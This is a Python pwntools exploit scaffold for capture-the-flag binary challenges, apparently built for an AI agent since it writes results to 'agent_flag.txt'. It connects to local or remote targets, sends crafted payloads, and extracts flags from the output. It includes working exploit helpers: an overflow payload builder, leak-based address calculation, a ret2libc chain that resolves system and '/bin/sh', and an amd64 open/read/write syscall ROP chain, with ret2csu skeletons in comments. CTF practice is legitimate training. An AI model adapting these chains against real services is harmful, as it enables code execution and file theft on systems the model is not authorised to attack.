#!/usr/bin/env python3
from pwn import *
import argparse
import binascii
import os
import re
import shlex
import time


GDBSCRIPT = """
set pagination off
set follow-fork-mode child
continue
"""

FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"


def env_flag(name: str) -> bool:
    return os.getenv(name, "").lower() in {"1", "true", "yes", "on"}


def load_elf(path: str | None):
    return ELF(path, checksec=False) if path else None


def start(args, argv=None):
    argv = argv or []
    if args.remote or env_flag("REMOTE"):
        host = args.host or os.getenv("HOST")
        port = args.port or os.getenv("PORT")
        if not host or not port:
            raise SystemExit("remote mode requires --host/--port or HOST/PORT env vars")
        cooldown = max(0.0, float(args.connect_cooldown or 0.0))
        retries = max(0, int(args.connect_retries or 0))
        last_exc = None
        for attempt in range(retries + 1):
            try:
                if cooldown > 0 and attempt > 0:
                    time.sleep(cooldown)
                return remote(host, int(port), timeout=args.timeout)
            except Exception as exc:
                last_exc = exc
                log.warning("remote connect attempt %d/%d failed: %s", attempt + 1, retries + 1, exc)
        raise SystemExit(f"remote connection failed after {retries + 1} attempts: {last_exc}")

    env = {}
    if args.ld_preload:
        env["LD_PRELOAD"] = args.ld_preload

    if args.use_bundled_libc and args.ld and args.libc:
        cmd = [args.ld, "--library-path", os.path.dirname(args.libc) or ".", args.binary, *argv]
    else:
        cmd = [args.binary, *argv]

    if args.gdb or env_flag("GDB"):
        return gdb.debug(cmd, gdbscript=args.gdbscript or GDBSCRIPT, env=env)
    return process(cmd, env=env)


def extract_flag(data: bytes) -> str | None:
    match = re.search(FLAG_RE, data)
    return match.group(0).decode(errors="replace") if match else None


def write_flag(flag: str, path: str = "agent_flag.txt") -> None:
    print(flag)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(flag.strip() + "\n")


def recv_all(io, timeout: float = 2.0) -> bytes:
    try:
        return io.recvall(timeout=timeout)
    except EOFError:
        return b""


def load_payload_file(path: str | None) -> bytes | None:
    if not path:
        return None
    with open(path, "rb") as handle:
        return handle.read()


def decode_text_arg(value: str | None) -> bytes | None:
    if value is None:
        return None
    return value.encode()


def decode_hex_payload(value: str | None) -> bytes | None:
    if value is None:
        return None
    cleaned = value.replace(" ", "").replace("\\x", "")
    try:
        return binascii.unhexlify(cleaned)
    except binascii.Error as exc:
        raise SystemExit(f"invalid --hex-payload: {exc}") from exc


def parse_argv(value: str | None) -> list[str]:
    if not value:
        return []
    return shlex.split(value)


def flat_payload(offset: int, chain, filler: bytes = b"A") -> bytes:
    """Build a deterministic overflow payload after offset/control is proven."""
    if offset < 0:
        raise ValueError("offset must be non-negative")
    return flat({offset: chain}, filler=filler)


def leak_to_u64(data: bytes, pad: bytes = b"\x00") -> int:
    """Convert up to 8 leaked bytes into a little-endian u64 after leak class is known."""
    if not data:
        raise ValueError("empty leak")
    if len(pad) != 1:
        raise ValueError("pad must be one byte")
    return u64(data[:8].ljust(8, pad))


def parse_first_pointer(data: bytes) -> int | None:
    """Parse the first 0x-prefixed pointer from text output for quick leak triage."""
    match = re.search(rb"0x[0-9a-fA-F]+", data)
    return int(match.group(0), 16) if match else None


def classify_address(value: int) -> str:
    """Heuristic address class; confirm with binary/libc/source evidence before final math."""
    if value == 0:
        return "null"
    if 0x7F0000000000 <= value <= 0x7FFFFFFFFFFF:
        return "libc_or_ld_or_stack"
    if 0x550000000000 <= value <= 0x56FFFFFFFFFF:
        return "pie_or_heap"
    if 0x400000 <= value <= 0x7FFFFFFF:
        return "non_pie_binary_or_mmap"
    if 0xFFFFFFFF80000000 <= value <= 0xFFFFFFFFFFFFFFFF:
        return "kernel"
    return "unknown"


def calc_base(leak: int, symbol_offset: int, align: int = 0x1000) -> int:
    """Calculate a base from a known-class leak and symbol offset, then page-align sanity-check."""
    base = leak - symbol_offset
    if base < 0:
        raise ValueError("negative base from leak/offset")
    if align and base % align != 0:
        log.warning("base %#x is not aligned to %#x; recheck leak class/offset", base, align)
    return base


def require_range(name: str, value: int, low: int, high: int) -> int:
    """Fail fast when a computed leak/base is outside the expected range."""
    if not (low <= value <= high):
        raise ValueError(f"{name}={value:#x} outside expected range {low:#x}-{high:#x}")
    return value


def ret2libc_chain(libc, system_addr: int | None = None, binsh_addr: int | None = None, exit_addr: int | None = None):
    """Return a minimal ret2libc call tuple after libc base and alignment assumptions are proven."""
    if libc is None:
        raise ValueError("libc ELF is required")
    system_addr = system_addr if system_addr is not None else libc.sym.get("system")
    binsh_addr = binsh_addr if binsh_addr is not None else next(libc.search(b"/bin/sh\x00"), None)
    exit_addr = exit_addr if exit_addr is not None else libc.sym.get("exit", 0)
    if not system_addr or not binsh_addr:
        raise ValueError("system or /bin/sh not found in libc")
    return system_addr, binsh_addr, exit_addr


def amd64_orw_chain(pop_rax: int, pop_rdi: int, pop_rsi: int, pop_rdx: int, syscall: int, path_addr: int, buf_addr: int, size: int = 0x100, fd: int = 3):
    """Skeleton ORW chain for amd64 after ctf-pwn-syscall-orw-check confirms ABI and allowlist."""
    SYS_open = 2
    SYS_read = 0
    SYS_write = 1
    return flat([
        pop_rax, SYS_open, pop_rdi, path_addr, pop_rsi, 0, pop_rdx, 0, syscall,
        pop_rax, SYS_read, pop_rdi, fd, pop_rsi, buf_addr, pop_rdx, size, syscall,
        pop_rax, SYS_write, pop_rdi, 1, pop_rsi, buf_addr, pop_rdx, size, syscall,
    ])


def log_drift_context(args, stage: str = "unknown") -> None:
    """Print remote-drift context before changing gadgets/libc/offsets."""
    log.info("drift_stage=%s remote=%s host=%s port=%s binary=%s libc=%s ld_preload=%s timeout=%s", stage, bool(args.remote or env_flag("REMOTE")), args.host, args.port, args.binary, args.libc, args.ld_preload, args.timeout)


def document_orw_route() -> None:
    """Checklist-only helper: use after ctf-pwn-syscall-orw-check confirms ORW is viable."""
    log.info("ORW checklist: syscall ABI, open/openat allowlist, writable buffer, and write-to-stdout/socket closure must be verified")


def document_ret2csu_route() -> None:
    """Checklist-only helper: use after ctf-pwn-ret2csu-check confirms paired csu gadgets."""
    log.info("ret2csu checklist: control offset, pop/call gadget pair, callable pointer, rbx/rbp loop, argument mapping, and alignment")


def solve(args) -> None:
    elf = load_elf(args.binary)
    libc = load_elf(args.libc)
    if elf:
        context.binary = elf
    context.log_level = args.log_level
    if args.debug_drift:
        log_drift_context(args, "startup")

    payload = decode_hex_payload(args.hex_payload) or load_payload_file(args.payload_file)
    if args.dry_run_payload:
        preview = payload if payload is not None else decode_text_arg(args.sendline) or b""
        print(preview.hex())
        return

    io = start(args, parse_argv(args.argv))

    if args.recvuntil:
        io.recvuntil(decode_text_arg(args.recvuntil), timeout=args.timeout)

    if payload is not None:
        if args.line_payload:
            io.sendline(payload)
        elif args.sendafter:
            io.sendafter(decode_text_arg(args.sendafter), payload, timeout=args.timeout)
        else:
            io.send(payload)
    elif args.sendline is not None:
        if args.sendafter:
            io.sendlineafter(decode_text_arg(args.sendafter), args.sendline.encode(), timeout=args.timeout)
        else:
            io.sendline(args.sendline.encode())

    # Exploit scaffold:
    # 1. Prove reachability/control/leak before final payload logic.
    # 2. Keep offsets, gadgets, and leak base assumptions deterministic.
    # 3. Prefer direct flag read/ORW when shell is blocked by seccomp.
    # 4. For ORW, first confirm syscall ABI registers and seccomp allowlist with ctf-pwn-syscall-orw-check.
    # 5. For ret2csu, first confirm paired pop/call gadget shape with ctf-pwn-ret2csu-check.
    #
    # ORW skeleton after proof (fill exact gadgets/syscall numbers for target arch):
    #   document_orw_route()
    #   chain = [pop_rax, SYS_openat, pop_rdi, AT_FDCWD, pop_rsi, flag_path, pop_rdx, 0, syscall]
    #   chain += [pop_rax, SYS_read, pop_rdi, fd, pop_rsi, bss, pop_rdx, 0x100, syscall]
    #   chain += [pop_rax, SYS_write, pop_rdi, 1, pop_rsi, bss, pop_rdx, 0x100, syscall]
    #
    # ret2csu skeleton after proof (verify mapping for this binary, do not assume):
    #   document_ret2csu_route()
    #   chain = [csu_pop, 0, 1, call_ptr, arg1, arg2, arg3, csu_call, padding_after_csu]
    _ = libc

    if args.interactive:
        io.interactive()
        return

    data = recv_all(io, args.timeout)
    flag = extract_flag(data)
    if flag:
        write_flag(flag, args.flag_file)
        return

    log.warning("No flag found in output. Use --interactive or --gdb for debugging.")
    print(data.decode(errors="replace"))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default="./chall")
    parser.add_argument("--libc")
    parser.add_argument("--ld")
    parser.add_argument("--use-bundled-libc", action="store_true", help="Run the binary via bundled ld-linux --library-path when binary/libc/ld from the challenge must stay aligned.")
    parser.add_argument("--ld-preload")
    parser.add_argument("--argv", help="Extra argv string for local process targets, parsed with shlex.split for quoted args.")
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default=os.getenv("HOST"))
    parser.add_argument("--port", default=os.getenv("PORT"))
    parser.add_argument("--gdb", action="store_true")
    parser.add_argument("--gdbscript")
    parser.add_argument("--interactive", action="store_true")
    parser.add_argument("--payload-file", help="Send raw bytes from a local payload file before receiving output.")
    parser.add_argument("--hex-payload", help="Send hex-decoded bytes, e.g. '41414141' or '\\x41\\x41'.")
    parser.add_argument("--line-payload", action="store_true", help="Send payload-file/hex-payload with sendline instead of send.")
    parser.add_argument("--dry-run-payload", action="store_true", help="Print payload bytes as hex and exit without opening the target.")
    parser.add_argument("--recvuntil", help="Receive until this text before sending payload or line.")
    parser.add_argument("--sendafter", help="Wait for this text before sending payload or line.")
    parser.add_argument("--sendline", help="Send one text line before receiving output; useful for quick protocol checks.")
    parser.add_argument("--timeout", type=float, default=2.0)
    parser.add_argument("--connect-retries", type=int, default=int(os.getenv("CONNECT_RETRIES", "0")), help="Automatic remote reconnect attempts before giving up.")
    parser.add_argument("--connect-cooldown", type=float, default=float(os.getenv("CONNECT_COOLDOWN", "0")), help="Seconds to sleep between remote reconnect attempts.")
    parser.add_argument("--log-level", default=os.getenv("PWNLIB_LOG_LEVEL", "info"))
    parser.add_argument("--debug-drift", action="store_true", help="Log local/remote/libc/prompt context before exploit mutation.")
    parser.add_argument("--flag-file", default="agent_flag.txt")
    args = parser.parse_args()
    solve(args)


if __name__ == "__main__":
    main()
